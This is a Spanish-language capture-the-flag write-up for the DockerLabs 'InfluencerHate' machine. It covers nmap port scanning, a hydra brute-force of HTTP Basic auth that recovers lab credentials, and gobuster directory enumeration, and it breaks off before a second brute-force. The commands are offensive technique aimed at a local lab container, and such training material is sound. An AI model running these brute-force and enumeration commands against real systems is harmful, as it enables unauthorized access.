# 🖥️ Writeup - InfluencerHate 

**Plataforma:** Dockerlabs  
**Dificultad:** Easy  
**Sistema Operativo:** Linux  

# INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash 
unzip influencerhate.zip
```
La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh influencerhate.tar
``` 
Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
``` 

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

# ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
``` 

```bash
nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
```

Info:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-09 18:26 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000028s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 86:ba:77:96:38:4e:54:22:d9:09:f1:03:17:bd:52:43 (ECDSA)
|_  256 28:b4:8b:66:08:67:77:f9:b0:f6:c2:94:58:34:dd:47 (ED25519)
80/tcp open  http    Apache httpd 2.4.62
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Zona restringida
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: 401 Unauthorized
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.84 seconds
```

Cuando entramos por el puerto 80 vemos que no estamos autorizados para ver la pagina ya que requiere de un usuario y contraseña.

Vamos a probar de aplicar fuerza bruta a el panel de login, teniendo en cuenta que el formato del diccionario que le tenemos que pasar es usuario:contraseña.

Tenemos un diccionario por defecto con este formato llamado ftp-betterdefaultpasslist.txt . Si no nos encuentra credenciales, tambien podemos modificar cualquier otro diccionario para aplicarle este formato.

# HYDRA

```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 172.17.0.2 http-get / -t 64
```

Info:
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-09 18:40:12
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 66 login tries, ~2 tries per task
[DATA] attacking http-get://172.17.0.2:80/
[80][http-get] host: 172.17.0.2   login: httpadmin   password: fhttpadmin
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-09 18:40:23
```
Encontramos las credenciales httpadmin : fhttpadmin

Una vez dentro nos encontramos con una default page de apache2.

# GOBUSTER

Vamos a buscar directorios o archivos ocultos en la pagina web con gobuster, pero para eso tambien tenemos que proporcionar las credenciales en el comando.

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html -H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=" -k -t 50
```

Info:
```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/login.php            (Status: 200) [Size: 2798]
/server-status        (Status: 403) [Size: 275]
```

Existe un login.php, asi que vamos a volver a intentar un ataque de fuerza bruta.

```bash

```